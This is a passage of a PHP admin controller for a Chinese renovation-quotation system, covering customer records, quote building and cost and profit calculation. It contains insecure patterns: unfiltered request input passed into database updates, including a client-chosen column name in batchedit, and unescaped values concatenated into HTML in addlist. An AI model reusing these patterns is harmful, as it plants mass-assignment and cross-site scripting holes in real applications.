<?php

// +----------------------------------------------------------------------
// | 报价管理
// +----------------------------------------------------------------------
namespace app\admin\controller;

use app\common\controller\Adminbase;
use think\Db;
use think\Paginator;
use think\Request;
use think\db\Where;

use PHPExcel;
use PHPExcel_IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
use PhpOffice\PhpSpreadsheet\IOFactory;



class Offerlist extends Adminbase
{
  public $upper = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');
  public $lower = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z');
  public $gongzhong=array('泥瓦工种','水电工程','木制作','木工其他','扇灰工程','油漆类','形象保护','打拆工种','其他综合项目','加建工程');//工种
    // protected function initialize()
    // {
    //     parent::initialize();
    // }
    public $search = [ 'customer_name','quoter_name','designer_name','address','manager_name' ];
  
    public $show_page = 15;
  
    public function userlist(){
        $where = new Where;
        $condition = [];//用于时间搜索 new where不会用
        if(input('customer_name')){
            $where['customer_name'] = ['LIKE','%'.input('customer_name').'%'];
        }
        if(input('quoter_name')){
            $where['quoter_name'] = ['LIKE','%'.input('quoter_name').'%'];
        }
        if(input('designer_name')){
            $where['designer_name'] = ['LIKE','%'.input('designer_name').'%'];
        }
        if(input('address')){
            $where['address'] = ['LIKE','%'.input('address').'%'];
        }
        if(input('manager_name')){
            $where['manager_name'] = ['LIKE','%'.input('manager_name').'%'];
        }
        if(input('begin_time') && input('end_time')){
            $condition = array(['addtime','>',strtotime(input('begin_time'))],['addtime','<',strtotime('+1 day',strtotime(input('end_time')))]);
        }        
        $re = Db::name('userlist')->where($where)->where($condition)->paginate($this->show_page);
        $this->assign('data',$re);
        return $this->fetch();
    }
    public function user_delete(){
      $re = Db::name('userlist')->delete(input('id'));
        $re ? $this->success('删除成功') : $this->error('删除有误');
    }
    public function user_edit(){
      if($this->request->isPost()){
        $id = input('id');
        $data = input();
        unset($data['id']);
      $re = Db::name('userlist')->where('id',input('id'))->update($data);
        $re ? $this->success('保存成功','admin/offerlist/userlist') : $this->error('保存失败');
      }else{
          $data = Db::name('userlist')->where('id',input('id'))->find();
            $this->assign('data',$data);
            return $this->fetch();
      }
    }
    /**
      * @function  index  客户档案首页
      * @author  Han
      * @version  1.0
      * @param $id 客户id   $cid 项目编号id
    */
    public function index()
    {
    // $this->newcheckrule();//权限检测
        error_reporting(E_ALL ^ E_WARNING);
        $userinfo = $this->_userinfo; 
        if($userinfo['roleid'] != 1){
            $da['o.userid'] = $userinfo['userid'];
        }
        $da['o.number'] = 1;
        if(!empty(input('customer_id'))){
            $da['o.customerid'] = input('customer_id'); 
        }
        //客户姓名搜索
        if($this->request->isPost()){
            $search = $this->request->post('search');
      foreach($search as $key=>$value){
        if(!empty($value)){
          switch($key){
            case "'customer_name'":
            $where['u.customer_name'] = ['LIKE','%'.$value.'%'];
            break;
            case "'quoter_name'":
            $where['u.quoter_name'] = ['LIKE','%'.$value.'%'];
            break;
            case "'designer_name'":
            $where['u.designer_name'] = ['LIKE','%'.$value.'%'];
            break;
            case "'address'":
            $where['u.address'] = ['LIKE','%'.$value.'%'];
            break;
            case "'manager_name'":
            $where['u.manager_name'] = ['LIKE','%'.$value.'%'];
            break;
          }
        }
      }
            if(empty($search)){
                $this->error('请输入搜索内容', url("offerlist/index"));
            }
            $res = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address,u.manager_name as manager_name')->join('userlist u','o.customerid = u.id')->where($da)->where($where)->select();
                
        // dump($res);exit;
            $this->assign('data',$res);   
            $this->assign('userinfo',$userinfo);    
            return $this->fetch();
        }
        //所有客户信息
        $res = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address,u.manager_name as manager_name')->join('userlist u','o.customerid = u.id')->where($da)->select();
        // var_dump($res);die;
        //统计报价开始 
        foreach ($res as $key => $value) {
            $content = json_decode($value['content'],true);
            foreach($content as $keys => $values){
                $res[$key]['matquant'] += $values['quotaall'];//每个项目的辅材总价累加
                $res[$key]['manual_quota'] += $values['craft_showall'];//每个项目的人工总价累加
            }
            $res[$key]['direct_cost'] = $res[$key]['matquant']+$res[$key]['manual_quota'];//工程总报价 辅材+人工
            $res[$key]['proquant'] = $res[$key]['matquant']+$res[$key]['manual_quota']+$res[$key]['tubemoney']+$res[$key]['taxes']-$res[$key]['discount']; //工程总报价 + 管理费+税金+优惠

            //=========================3en 开始
            //计算总人工成本
            $artificial = json_decode($value['artificial'],true);
            $res[$key]['artificial_cb'] = 0;
            foreach($artificial as $k=>$v){
                $res[$key]['artificial_cb'] += ($v['num']*$v['cb']);//人工总成本
            }
            //计算辅材成本
            $material = json_decode($value['material'],true);
            $res[$key]['material_cb'] = 0;
            foreach($material as $k=>$v){
                $res[$key]['material_cb'] += ($v['num']*$v['price']);//辅材总成本
            }
            //计算毛利 利润/报价
            if($res[$key]['direct_cost']){
                $res[$key]['profit'] = round(($res[$key]['direct_cost'] - $res[$key]['artificial_cb'] - $res[$key]['material_cb'] - $res[$key]['discount'] ) / $res[$key]['direct_cost'] * 100,2);
            }else{
                $res[$key]['profit']  = 0;
            }
            
        }
        $this->assign('data',$res);    
        $this->assign('userinfo',$userinfo);    
        return $this->fetch();
    }

    //选择客户
    public function baojia_first(){
        $where = new Where;
        if(input('customer_name')){
            $where['customer_name'] = ['LIKE','%'.input('customer_name').'%'];
        }
        if(input('quoter_name')){
            $where['quoter_name'] = ['LIKE','%'.input('quoter_name').'%'];
        }
        if(input('designer_name')){
            $where['designer_name'] = ['LIKE','%'.input('designer_name').'%'];
        }
        if(input('address')){
            $where['address'] = ['LIKE','%'.input('address').'%'];
        }
        if(input('manager_name')){
            $where['manager_name'] = ['LIKE','%'.input('manager_name').'%'];
        }
        if(!empty($where)){
            $re = Db::name('userlist')->where($where)->paginate($this->show_page);
        }else{
            $re = Db::name('userlist')->paginate($this->show_page);
        }
        $this->assign('data',$re);
        return $this->fetch();
    }
  
    //选择订单 (m没用了)
    public function baojiaguanli()
    {
        error_reporting(E_ALL ^ E_WARNING);
        $userinfo = $this->_userinfo; 
        if($userinfo['userid'] != 1){
            $da['o.userid'] = $userinfo['userid'];
        }
        $da['o.number'] = 1;
        //客户姓名搜索
        //if($this->request->isPost()){
            $search = input('search');
            if(!empty($search)){
               // $this->error('请输入搜索内容', url("offerlist/index"));
           // }else{
            $res = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address,u.manager_name as manager_name')->join('userlist u','o.customerid = u.id')->where($da)->where('u.customer_name','LIKE','%'.$search)->select();
            //$this->assign('data',$res);    
           // return $this->fetch();
        }else{
        //所有客户信息
        $res = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address,u.manager_name as manager_name')->join('userlist u','o.customerid = u.id')->where($da)->select();
            }
        //统计报价开始 
        foreach ($res as $key => $value) {
            $content = json_decode($value['content'],true);
            foreach($content as $keys => $values){
                $res[$key]['matquant'] += $values['quotaall'];//辅材报价
                $res[$key]['manual_quota'] += $values['craft_showall'];//人工报价
            }
            $res[$key]['direct_cost'] = $res[$key]['matquant']+$res[$key]['manual_quota'];//工程直接费= 辅材报价+人工报价
            $res[$key]['proquant'] = $res[$key]['matquant']+$res[$key]['manual_quota']+$res[$key]['tubemoney']+$res[$key]['taxes']+$res[$key]['discount'];//工程报价

            $tariff = array();$labor_cost = '';$fucai = '';
            foreach ($content as $keys => $values) {
                $dinge[$keys] =  Db::name('offerquota')->field('item_number,labor_cost,content')->where('item_number',$content[$keys]['item_number'])->find();
                $tariff[$keys]['item_number'] = $content[$keys]['item_number'];
                $tariff[$keys]['gcl'] = $content[$keys]['gcl'];
                $tariff[$keys]['labor_cost'] = $dinge[$keys]['labor_cost'] * $content[$keys]['gcl'];//人工报价
                $tariff[$keys]['content'] = json_decode($dinge[$keys]['content'],true);
                $tariff[$keys]['fucai'] = 0;
                foreach ($tariff[$keys]['content'] as $e => $ll) {
                    if($ll[0] && is_numeric($ll[1])){
                        $price = $this->returnPrice($ll[0]);//辅材名称对应的价格；
                        $tariff[$keys]['fucai'] += $price*$ll[1]*$content[$keys]['gcl'];
                    }
                }
                $labor_cost += $tariff[$keys]['labor_cost'];
                $fucai += $tariff[$keys]['fucai']; 
            }
            $res[$key]['gross_profit'] = $labor_cost+$fucai;
            $res[$key]['content'] = $content;
        }
        $this->assign('data',$res);    
        $this->assign('userinfo',$userinfo);  
        return $this->fetch();
    }


    //按辅材名称返回辅材单价
    public function returnPrice($val){
        if(is_null($val)){
            return null;
        }
        $re = Db::name('materials')->field('price')->where('name',$val)->find();
        return $re['price'];
    }

    //报表历史记录
    public function history(){
        $userinfo = $this->_userinfo; 
        $request = request();

        $id = $request->param('customerid'); //用户id
        $o_id = $request->param('report_id');//订单id 不是我命名的= =
        $rs = [];
        $rs = model('offerlist')->get_order_info($o_id);
        $userinfo = Db::name('userlist')->where(['id'=>$id])->find();
        if(!empty($rs['content'])){
        // $rs['content'] = json_decode($rs['content'],true);
            $conditions_no = 0;$room_no = 0;$conditions = [];$room = [];
            foreach(json_decode($rs['content'],true) as $key=>$value){
                if(!in_array($value['type_of_work'],$conditions) ){
                  $id = Db::name('offer_type')->where('name',$value['type_of_work'])->value('id');
                  $conditions[$id] = $value['type_of_work'];
                }
            }
            foreach(json_decode($rs['content'],true) as $key=>$value){
                if(!in_array($value['kongjian'],$room) ){
                  $id = Db::name('offer_type')->where('name',$value['kongjian'])->value('id');
                  $room[$id] = $value['kongjian'];
                }
            }
            if( !empty($conditions) ){
                $new_data = [];
                $conditions_no = 0;
                foreach($conditions as $key=>$value){
                  foreach($room as $k=>$v){
                    foreach(json_decode($rs['content'],true) as $ke=>$val){
                        if($val['type_of_work'] ==$value){
                            $new_data[$key]['conditionsname'] = $value;
                            $new_data[$key]['conditions_no'] = $this->upper[$conditions_no];
                            if($val['kongjian'] == $v){
                                $new_data[$key]['son'][$k]['roomname'] = $v;
                                $new_data[$key]['son'][$k]['room_no'] = $this->lower[$room_no];
                                $new_data[$key]['son'][$k]['item'][] = $val;
                            }
                        }
                    }
                  }
                    $conditions_no++;
                }
            }
            foreach($new_data as $k1=>$v1){
                $room_no = 0;
                foreach($v1['son'] as $k2=>$v2){
                  $new_data[$k1]['son'][$k2]['room_no'] = $this->lower[$room_no];
                  $room_no++;
                }
            }
            $rs['details'] = $new_data;
        }
        $all = Db::name('offerlist')->where(["customerid" => trim($id)])->select();//该客户的所有报表
        $this->assign('all',$all);//该客户的所有报表id
        $this->assign('userinfo',$userinfo);//客户信息
        $edit_id = Db::name('offerlist')->where('customerid',$id)->value('id');
        $this->assign('edit_id',$edit_id);//新建报表id
        $this->assign("data", $rs);//报表数据

        return $this->fetch();
    }


   // 弹窗修改信息
    public function ajaxedits(){
         $datas = input();
         if($datas){
            $data['type_of_work'] = $datas['type_of_work'];
            $data['project'] = $datas['project'];
            $data['company'] = $datas['company'];
            $data['cost_value'] = $datas['cost_value'];
            $data['quota'] = $datas['quota'];
            $data['craft_show'] = $datas['craft_show'];
            $data['material'] = $datas['material'];
            $res = Db::name('offerlist')->where('id',$datas['id'])->update($data);
            if($res) {
               Result(0,'更新成功',$data);
            }else{
               Result(1,'更新失败'); 
            }
         }else{
            Result(1,'获取数据失败');
         }
         // dump($datas);

    }
    //批量修改字段数据
    public function batchedit()
    {
        $datas = input();
         if($datas){
            $batch = $datas['batchname'];//字段名字
            $data[$batch] = $datas['value'];//字段内容
            $arr = $datas['idarray'];
            //利用 explode 函数分割字符串到数组 
            $arr = explode(',',$arr);
             //把获取到的二维数组遍历进数据库
             foreach ($arr as $key => $value) {
                 $res = Db::name('offerlist')->where('id',$value)->update($data);
             }

            Result(0,'字段更新成功',$data);

            // $res = Db::name('offerlist')->where('id',$datas['id'])->update($data);
            // if($res) {
            //    Result(0,'更新成功',$data);
            // }else{
            //    Result(1,'更新失败'); 
            // }
         }else{
            Result(1,'获取数据失败');
         }
    }

    // 修改工程量接口
    public function gcledits(){
      if ($this->request->isPost()) {
        $data = input();
        // dump($data);exit;
        $find = Db::name('offerlist')->where('id',$data['dataid'])->find();
        if($find){
           $neirou = json_decode($find['content'],true);
           foreach ($neirou as $key => $value) {
             if($key == $data['j']){
               $neirou[$key]['gcl'] = $data['gcl'];
               $neirou[$key]['quotaall'] = $data['quotaall'];
               $neirou[$key]['craft_showall'] = $data['craft_showall'];
               // $neirou[$key]['pro_apartment_type'] = $data['pro_apartment_type'];
               // $neirou[$key]['area'] = $data['j']['area'];
             }
           }
           $shu['content'] = str_replace("\\/", "/", json_encode($neirou,JSON_UNESCAPED_UNICODE));

            // dump($neirou);dump($data['dataid']);exit;
            if(Db::name('offerlist')->where('id',$data['dataid'])->update($shu)){
              //计算辅材报价人工报价
              $getall = Db::name('offerlist')->where('id',$data['dataid'])->find();
              $newget = json_decode($getall['content'],true);
              foreach ($newget as $key => $value) {
              
               }



              Result(0,'操作成功！');
                // $this->success("添加条目成功！", url("offerlist/edit",array('id'=>$data['dataid'])));
            }else{
              Result(1,'操作失败了！',$data);
                // $this->error('添加失败了！');
            }           

        }else{
          Result(1,'获取数据失败');
        }

      }

    }

     // 修改空间类型接口
    public function kjedits(){
      if ($this->request->isPost()) {
        $data = input();
        $find = Db::name('offerlist')->where('id',$data['dataid'])->find();
        if($find){
           $neirou = json_decode($find['content'],true);
           foreach ($neirou as $key => $value) {
             if($key == $data['j']){
               $neirou[$key]['kongjian'] = $data['kongjian'];
             }
           }
           $shu['content'] = str_replace("\\/", "/", json_encode($neirou,JSON_UNESCAPED_UNICODE));

            // dump($neirou);dump($data['dataid']);exit;
            if(Db::name('offerlist')->where('id',$data['dataid'])->update($shu)){
              Result(0,'操作成功！');
                // $this->success("添加条目成功！", url("offerlist/edit",array('id'=>$data['dataid'])));
            }else{
              Result(1,'操作失败了！');
                // $this->error('添加失败了！');
            }           

        }else{
          Result(1,'获取数据失败');
        }

      }

    }

    // 报价导出数据接口
    public function baojia()
    {    
          // $res = Db::name('sertype')->alias('s')->field('s.*,u.img_url as img_url')->join('upload_img u','s.logo = u.id')->order('s.sort desc')->select();
         // $res = Db::name('offerlist')->alias('a')->field('a.*,b.name as bname')->join('offer_type b','a.typeid = b.id')->select();
         $userinfo = $this->_userinfo; 
         $da['userid'] = $userinfo['userid'];
         $res = Db::name('offerlist')->where($da)->select();
       
         $newdata = array();
         //过滤无用字段
         foreach ($res as $k => $v) {
             unset($v['addtime']);
             $newdata[$k] = $v;

         }
           // dump($news);
         if($newdata){
              TreeResult(0,'ok',$newdata,count($newdata));
          }else{
              TreeResult(1,'获取失败');
          }
    }

     // 是否启用该报价
    public function status()
    { 
    /*0:未报价 1:已报价 2:预算价 3:合同价 4:结算价*/
        if($this->request->isPost()){
          // return input();
            $data = input();
      if($data){
        $status = input('status');$id = input('id');$cid = input('customerid');
        if($id && $status){
          $res = Db::name('offerlist')->where('id',$id)->update(['status'=>$status]);
          if($res !== false){
            $this->success('操作成功');
          }else{
            $this->error('操作失败');
          }
        }
        
  //               $da['status'] = 0;
  //               $sele = Db::name('offerlist')->where('customerid',$data['customerid'])->select();
  //               if(count($sele) != 1){
  //                 $xin = Db::name('offerlist')->where('customerid',$data['customerid'])->update($da);
  //               }else{
  //                 $xin = 1;
  //               }
  // 
  //              if($xin !== false){
  //               $zhi['status'] = 1;
  //               $res = Db::name('offerlist')->where('id',$data['id'])->update($zhi);
  //               Result(0,'操作成功');
  //              }
      
      }else{
        Result(1,'信息获取失败');
      }
    }
      
    }


      //添加报表 新建客户
    public function add()
    {
        $userinfo = $this->_userinfo; 
        if ($this->request->isPost()) {
            $data = $this->request->param();
            $bao['userid'] = $userinfo['userid'];//报价员
            $bao['frameid'] =  ($userinfo['companyid']==1)?'152':$userinfo['companyid'];//存报价员公司
            $bao['customer_name'] =  $data['customer_name'];
            $bao['address'] =  $data['address'];
            $bao['quoter_name'] =  $data['quoter_name'];
            $bao['designer_name'] =  $data['designer_name'];
            $bao['manager_name'] = $data['manager_name'];
            $bao['addtime'] = time();
      // dump($data);exit;
            //开启事务
            Db::startTrans();
            try{
                $userlist = Db::name('userlist')->insertGetId($bao);
                // if($userlist) {        
                //     $offer['userid'] = $userinfo['userid'];//报价员     
                //     $offer['frameid'] = $userinfo['companyid'];//存公司id到报表
                //     $offer['customerid'] = $userlist;
                //     $offer['number'] = 1;
                //     $offer['entrytime'] = time();
                //     $insert = Db::name('offerlist')->insert($offer);
                // }     
                // 提交事务
                Db::commit();    
            } catch (\Exception $e) {
                // 回滚事务
                Db::rollback();
                $this->error('失败添加');
            }
            $this->success('添加成功','admin/offerlist/userlist');
               
        }
        return $this->fetch();
    }

      //历史添加
    public function adds(){
        $userinfo = $this->_userinfo; 
        if ($this->request->isPost()) {
            $param = input(); 
            $data = array();
            //dump(input());exit;
            $data['userid'] = $userinfo['userid'];
            $data['frameid'] = $userinfo['companyid'];//存公司id到报表
            $data['customerid'] = input('customerid');
            $data['unit'] = input('framename');//单位
            $data['entrytime'] = time();
            $data['number'] = 1;
            $content = [];
            foreach (input('gcl') as $key => $value) {
              foreach($value as $k=>$v){
                foreach($v as $k1=>$v1){
                  $item = Db::name('offerquota')->where('id',$k1)->find();//获取定额数据
                  $item['kongjian'] =Db::name('offer_type')->where('id',$k)->value('name');
                  $item['gcl']= $v1; //数量
                  $item['quotaall'] = $v1 * $item['quota']; //该项目的辅材总价
                  $item['craft_showall'] = $v1 * $item['craft_show']; //该项目的人工总价
                  $content[] = $item;
                }
              }
            }
            $data['content'] = json_encode($content); //这里获取了项目详情
            //===============================计算物料总合计 成本
            // $arr['工种类']['项目编号']['辅材名称'] = ['数量','成本','单价','利润']
            $material_all = [];
            $order_material = [];//订单辅料详情 - 以后顶替material_all这种json储存方法
            foreach($content as $k=>$v){
                $need_material = json_decode($v['content'],true);//需要的物料
                foreach($need_material as $one_material){
                    if($one_material[0] && $one_material[1]){
                        if(!isset($material_all[$one_material[0]])){
                            //上面2个foreach筛选offerquota表里面的content的有用数据 ( 里面有20个所需辅材 没有的用空数组代替 上面是提出空数组 )
                            $material_all[$one_material[0]]['num'] = 0;
                            $material_all[$one_material[0]]['price'] = 0;//成本单价
                        }
                        $materials_info = Db::name('materials')->where(array('frameid'=>$userinfo['companyid'],'name'=>$one_material[0]))->find();
                        $price = $materials_info['price'];
                        $coefficient = $materials_info['coefficient'];
                        if(!$price){
                            $this->error($one_material[0].'成本有误，请及时补充辅材仓库');
                        }
                        $material_all[$one_material[0]]['price'] = $price;//成本单价
                        $material_all[$one_material[0]]['coefficient'] = $coefficient;//系数
                        $material_all[$one_material[0]]['important'] = $materials_info['important'];
                        $material_all[$one_material[0]]['num'] += $one_material[1]*$v['gcl']; //需要的用料单数 * 工程单位

                        //===============订单辅料详情  $arr['工种类']['项目编号']['辅材名称'] = ['数量','成本','单价','利润']
                        if(!isset($order_material[$v['type_of_work']][$v['item_number']][$one_material[0]])){
                            //初始化数据 这个框架会神奇的报错 = =
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['cb'] = $materials_info['price'];//成本
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['price'] = $v['quota'];//辅材单价
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['profit'] = $v['quota']-$materials_info['price'];//利润
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['coefficient'] = $coefficient;//系数
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['important'] = $materials_info['important'];//是否重要
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['num'] = 0;//初始化数据
                            
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['amcode'] = $materials_info['amcode'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['fine'] = $materials_info['fine'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['brand'] = $materials_info['brand'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['place'] = $materials_info['place'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['img'] = $materials_info['img'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['phr'] = $materials_info['phr'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['remarks'] = $materials_info['remarks'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['category'] = $materials_info['category'];//
                            $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['units'] = $materials_info['units'];//
                        }
                        $order_material[$v['type_of_work']][$v['item_number']][$one_material[0]]['num'] += $one_material[1]*$v['gcl'];
                            
                        
                        //这里上面的数量 有可能是小数点. 后面需要根据需求来四舍五入  具体多少舍多少入看需求
                    }
                }
            }
            //=========订单辅料详情 组装数据存进数据库
            //$order_material['工种类']['项目编号']['辅材名称'] = ['数量','成本','单价','利润']
            $order_material_datas = [];
            foreach($order_material as $k1=>$v1){
                foreach($v1 as $k2=>$v2){
                    foreach($v2 as $k3=>$v3){
                        // $order_material_datas['o_id'] = '';//还没有
                        $data_info['c_id'] = $data['customerid'];
                        $data_info['f_id'] = $data['frameid'];
                        $data_info['type_of_work'] = $k1;;
                        $data_info['item_number'] = $k2;;
                        $data_info['m_name'] = $k3;
                        $data_info['num'] = $v3['num'];
                        $data_info['cb'] = $v3['cb'];
                        $data_info['price'] = $v3['price'];
                        $data_info['profit'] = $v3['profit'];
                        $data_info['coefficient'] = $v3['coefficient'];
                        $data_info['important'] = $v3['important'];

                        $data_info['amcode'] = $v3['amcode'];
                        $data_info['fine'] = $v3['fine'];
                        $data_info['brand'] = $v3['brand'];
                        $data_info['place'] = $v3['place'];
                        $data_info['img'] = $v3['img'];
                        $data_info['phr'] = $v3['phr'];
                        $data_info['remarks'] = $v3['remarks'];
                        $data_info['category'] = $v3['category'];
                        $data_info['units'] = $v3['units'];

                        $order_material_datas[] = $data_info;
                    }
                }
            }


            //=========旧版本的计算
            foreach($material_all as $k=>$v){
                //获取数量的小数
                $num = explode('.',$v['num']);
                if(!isset($num[1])){
                    $num[1] = 0;
                }
                if($num[1]*10 > $v['coefficient']){
                    $material_all[$k]['omit_num'] = ceil($v['num']);
                }else{
                    //不足1时向上取证
                    if($v['num'] < 1 && $v['important']){
                        $material_all[$k]['omit_num'] = ceil($v['num']);
                    }else{
                        $material_all[$k]['omit_num'] = floor($v['num']);
                    }
                }
                unset($material_all[$k]['coefficient']);
            }
            $data['material'] = json_encode($material_all); //物料成本 json格式 里面 辅材名字=>[num=>数量 ,price=>单价,omit_num=>系数后数量]

            //==============================计算人工成本
            
            $need_project = json_decode($data['content'],true);//需要的项目
            $artificial_all = [];//人工成本 , 报价(成本+利润)
            foreach($need_project as $k=>$v){
                $Offerquota_info = Db::name('Offerquota')->where(array('frameid'=>$userinfo['companyid'],'item_number'=>$v['item_number']))->find();
                if(!$Offerquota_info){
                    $this->error($one_material[0].'人工有误，请及时补充人工工费');
                }
                if(!isset($artificial_all[$v['item_number']])){
                  $artificial_all[$v['item_number']]['type_of_work'] = $Offerquota_info['type_of_work']; //工种
                  $artificial_all[$v['item_number']]['price'] = $Offerquota_info['craft_show']; //单价 
                  $artificial_all[$v['item_number']]['cb'] = $Offerquota_info['labor_cost']; //单个成本
                  $artificial_all[$v['item_number']]['profit'] = $Offerquota_info['craft_show'] - $Offerquota_info['labor_cost']; //单个利润 
                  $artificial_all[$v['item_number']]['num'] = 0;//数量
                }
                $artificial_all[$v['item_number']]['num'] += $v['gcl']; //数量
                
            }
            $data['artificial'] = json_encode($artificial_all); //人工成本 json格式 里面 num=>数量 price=>单价 cb=>成本 profit=>利润
            //其他各种费用比率
            $cost_tmp = Db::name('cost_tmp')->where(['f_id'=>$data['frameid']])->find();
            if(!$cost_tmp){
                //没有设置  这个是默认值
                $cost_tmp_data = [
                    'tubemoney'=>1,
                    'carry'=>0,
                    'clean'=>0,
                    'accident'=>0,
                    'remote'=>0,
                    'old_house'=>0,
                    'taxes'=>0,
                    'supervisor_commission'=>0,
                    'design_commission'=>0,
                    'repeat_commission'=>3,
                    'business_commission'=>0
                ];
            }else{
                $cost_tmp_data = [
                    'tubemoney'=>$cost_tmp['tubemoney'],
                    'carry'=>$cost_tmp['carry'],
                    'clean'=>$cost_tmp['clean'],
                    'accident'=>$cost_tmp['accident'],
                    'remote'=>$cost_tmp['remote'],
                    'old_house'=>$cost_tmp['old_house'],
                    'taxes'=>$cost_tmp['taxes'],
                    'supervisor_commission'=>$cost_tmp['supervisor'],
                    'design_commission'=>$cost_tmp['design'],
                    'repeat_commission'=>$cost_tmp['repeat'],
                    'business_commission'=>$cost_tmp['business']
                ];
            }
            $data = array_merge($data,$cost_tmp_data);
            Db::startTrans();
            try{
                $re = Db::name('offerlist')->insertGetId($data);
                foreach($order_material_datas as $k=>$v){
                    $order_material_datas[$k]['o_id'] = $re;
                }
                if($order_material_datas){
                    $order_material_res = Db::name('order_material')->insertAll($order_material_datas);
                }else{
                    $order_material_res = 1;
                }
                // 提交事务
                Db::commit();    
            } catch (\Exception $e) {
                // 回滚事务
                Db::rollback();
                $this->error('失败');
            }
            if($re!==false && $order_material_res){
                $this->success('成功','admin/offerlist/baojiaguanli');
            }else{
                $this->error('失败');
            }
        }
    }
    //新版本添加条目
    public function addlist()
    {
         $userinfo = $this->_userinfo; 
        if ($this->request->isPost()) {
            //返回选择的定额数据
            $res = [];
            $search = input('type_of_work');
            if($search){
              if($userinfo['userid']==1){
                $res = Db::name('Offerquota')->where('type_of_work',$search)->select();
              }else{
                $res = Db::name('Offerquota')->where('frameid',$userinfo['companyid'])->where('type_of_work',$search)->select();
              }
            }

            //搜索返回
            $project = input('project');//项目名称搜索
            $item_number = input('item_number');//编号搜索
            $searchtype = input('searchtype');//工种
            $where = [];
            if($item_number){
                $where['item_number'] = $item_number;
            }
            if($where || $project){
              $where['type_of_work'] = $searchtype;
              if($userinfo['userid']==1){
                $res = Db::name('Offerquota')->where($where)->select();
                if($project){
                  $res = Db::name('Offerquota')->where($where)->where('project','LIKE',"%".$project."%")->select();
                }
              }else{
                $res = Db::name('Offerquota')->where('frameid',$userinfo['companyid'])->where($where)->select();
                if($project){
                  $res = Db::name('Offerquota')->where('frameid',$userinfo['companyid'])->where($where)->where('project','LIKE',"%".$project."%")->select();
                }
              }
            }
            //数据处理
            $str = '';
            if($res){
                foreach ($res as $key => $value) {
                  $str .= '<tr>
                          <td><input type="checkbox" name="check" data-id="'.$value['id'].'"></td>
                          <td>'.$value['id'].'</td>    
                          <td>'.$value['item_number'].'</td>     
                          <td>'.getcid($value['frameid']).'</td>    
                          <td>'.$value['type_of_work'].'</td>                                     
                          <td>'.$value['project'].'</td>                                     
                          <td>'.$value['company'].'</td>                                     
                          <td>'.$value['quota'].'</td>                                     
                          <td>'.$value['craft_show'].'</td> 
                          <td>'.$value['cost_value'].'</td>                              
                        </tr> ';
                
               }
            }
              return json([ 'html'=>$str ]);
        }
    }
     /**
     * 获取数据
     */
    public function ceshi(){
        if ($this->request->isPost()){
           $data = input();
           $nid = $data['nid'];
           // dump($data);
           $valzhi = json_decode(htmlspecialchars_decode($data['value']),true);
           foreach ($valzhi as $key => $value) {
              $valzhi[$key]['kongjian'] = '';
              $valzhi[$key]['gcl'] = '';
              $valzhi[$key]['quotaall'] = '';
              $valzhi[$key]['craft_showall'] = '';
              unset( $valzhi[$key]['frameid']);
           }
           $find = Db::name('offerlist')->where('id',$nid)->find();
           if($find['content']){
             $arr1 = json_decode($find['content'],true);
             $arr2 = $valzhi;
             $newarr = array_merge($arr1,$arr2);
           }else{
             $newarr = $valzhi;
           }
            $shu['content'] = str_replace("\\/", "/", json_encode($newarr,JSON_UNESCAPED_UNICODE));

            if(Db::name('offerlist')->where('id',$nid)->update($shu)){
                $this->success("添加条目成功！", url("offerlist/edit",array('id'=>$nid)));
            }else{
              Result(1,'添加失败了！');
            }           
              
        }  

    } 

    /**
     * 选择报价条目
     */
    public function ajaxquery(){
         $frameid = 6;//需计算当前报价员的公司id
          if ($this->request->isPost()){
              $sres = Db::name('offerquota')->where(array('frameid'=>$frameid,'item_number'=>input('value')))->find();
              if($sres){
                 Result(0,'校检成功',$sres);
              }else{
                 Result(1,'没有查询到该编号');
              }
          }
    } 

    public function zengjian_first(){
        $where = new Where;
        if(input('customer_name')){
            $where['customer_name'] = ['LIKE','%'.input('customer_name').'%'];
        }
        if(input('quoter_name')){
            $where['quoter_name'] = ['LIKE','%'.input('quoter_name').'%'];
        }
        if(input('designer_name')){
            $where['designer_name'] = ['LIKE','%'.input('designer_name').'%'];
        }
        if(input('address')){
            $where['address'] = ['LIKE','%'.input('address').'%'];
        }
        if(input('manager_name')){
            $where['manager_name'] = ['LIKE','%'.input('manager_name').'%'];
        }
        if(!empty($where)){
            $re = Db::name('userlist')->where($where)->paginate($this->show_page);
        }else{
            $re = Db::name('userlist')->paginate($this->show_page);
        }
        $this->assign('data',$re);
        return $this->fetch();
    }

    //增减项
  public function zengjian(){
  
    $userinfo = $this->_userinfo; 
    
      $request = request();
      $id = $request->param('id');
    if(empty($id)){
      return $this->fetch();
    }
    $this->assign('id',$id);
      $rs = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address')->join('userlist u','o.customerid = u.id')->where(["o.id" => trim($id)])->find();
      // dump($rs);
    if(!empty($rs['content'])){
